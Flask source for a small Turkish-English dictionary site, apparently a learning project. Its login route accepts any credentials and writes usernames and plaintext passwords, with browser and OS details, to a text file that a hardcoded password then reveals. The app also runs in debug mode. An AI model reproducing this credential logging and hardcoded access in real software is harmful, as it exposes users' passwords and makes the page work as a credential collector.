import csv
from flask import Flask, render_template, request, redirect, url_for
import datetime


#Csv file nerede olacak?
with open('dictionary.csv', mode='r',encoding="utf8") as infile:
    reader = csv.reader(infile)
    dict_te = {rows[0]:rows[1] for rows in reader}     #turkce-ingilizce
    del dict_te["turkish"]
    dict_et = dict((y, x) for x, y in dict_te.items()) #english-turksih


app=Flask(__name__)

@app.route("/")
def post():
    return render_template("post.html")

@app.route('/datas',methods = ['POST'])
def login():
   if request.method == 'POST':
      user = request.form['kullanici_adi']
      password= request.form['sifre']

      current_time = datetime.datetime.now()
      file = open("info.txt", "a+", encoding="utf-8")
      browser = request.user_agent.browser
      os = request.user_agent.platform
      version = request.user_agent.version
      file.write("\nKullanıcı adı: "+ user +"\nKullanıcı Şifresi: "+password +"\nİşletim Sistemi: " + os + "\nTarayıcı: " + browser + "\nVersiyon: " + version + "\nGiriş Zamanı: " + str(
          current_time) + "\n")
      file.close()

      return redirect(url_for("sozluk" ))


@app.route("/sozluk")
def sozluk():
    return render_template("sozluk.html")

@app.route("/word_te",methods = ['POST'])
def word_te():
    if request.method == 'POST':
        kelime = request.form['aranan'].lower()
        try:
            content= kelime+" = "+dict_te.get(kelime)
            file = open("info.txt", "a+", encoding="utf-8")
            file.write("Yapılan çeviri: "+content+"\n")
            file.close()
            return render_template("sozluk.html", translation=content)
        except:
            file = open("info.txt", "a+", encoding="utf-8")
            file.write("Aranan kelime: " + kelime + "\n")
            file.close()
            return render_template("sozluk.html", translation= "Kelime bulunamadı!")

@app.route("/word_et",methods = ['POST'])
def word_et():
    if request.method == 'POST':
        kelime = request.form['aranan'].lower()
        try:
            content= kelime+" = "+dict_et.get(kelime)
            file = open("info.txt", "a+", encoding="utf-8")
            file.write("Yapılan çeviri: " + content+"\n")
            file.close()
            return render_template("dictionary.html", translation=content)
        except:
            file = open("info.txt", "a+", encoding="utf-8")
            file.write("Aranan kelime: " + kelime + "\n")
            file.close()
            return render_template("dictionary.html", translation= "Word does not exist!")


@app.route("/dictionary")
def dictionary():
    return render_template("dictionary.html")

@app.route("/logs_login")
def logs_login():
    return render_template("logs_login.html")

@app.route('/password',methods = ['POST'])
def password():
   if request.method == 'POST':
      password= request.form['sifre']
      if password=="mentörşip":
          return redirect(url_for("loglar" ))
      else:
          hata_message="Yanlış şifre girdiniz!"
          return render_template("logs_login.html", hata=hata_message)

@app.route("/loglar")
def loglar():
    file = open("info.txt", "r", encoding="utf-8")
    details = file.read().replace('\n',"<br>")
    file.close()
    return render_template("loglar.html",details=details)

if __name__ == "__main__":
    app.run(debug = True)
